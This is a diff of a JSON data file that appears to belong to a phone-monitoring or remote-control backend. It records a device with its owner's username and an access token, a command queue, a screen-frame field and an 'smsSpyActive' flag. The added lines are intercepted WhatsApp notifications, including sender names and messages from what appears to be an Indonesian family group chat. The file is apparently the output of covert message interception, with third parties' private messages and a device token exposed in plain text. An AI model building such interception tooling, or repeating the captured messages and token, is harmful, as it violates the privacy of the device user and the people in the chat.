@@ -9345,7 +9345,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777249721290,
+    "lastSeen": 1777249743728,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -9361,6 +9361,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎23 pesan dari 3 chat",
+        "time": "27/04 08:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777249744949
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎21 pesan dari 3 chat",
+        "time": "27/04 08:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777249725966
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎BUNDA REMPONG (17 pesan): ~ Nasi Goreng Bang Husaein",
+        "content": "Ok mi sj too",
+        "time": "27/04 08:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777249725908
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎20 pesan dari 3 chat",
+        "time": "27/04 08:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777249725144
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎BUNDA REMPONG (16 pesan): Sppu Hayati",
+        "content": "Kita bicarakan dulu ke aji nini apa dia sdh siap ka hari rabu",
+        "time": "27/04 08:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777249724921
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎BUNDA REMPONG (15 pesan): ~ anhysona005",
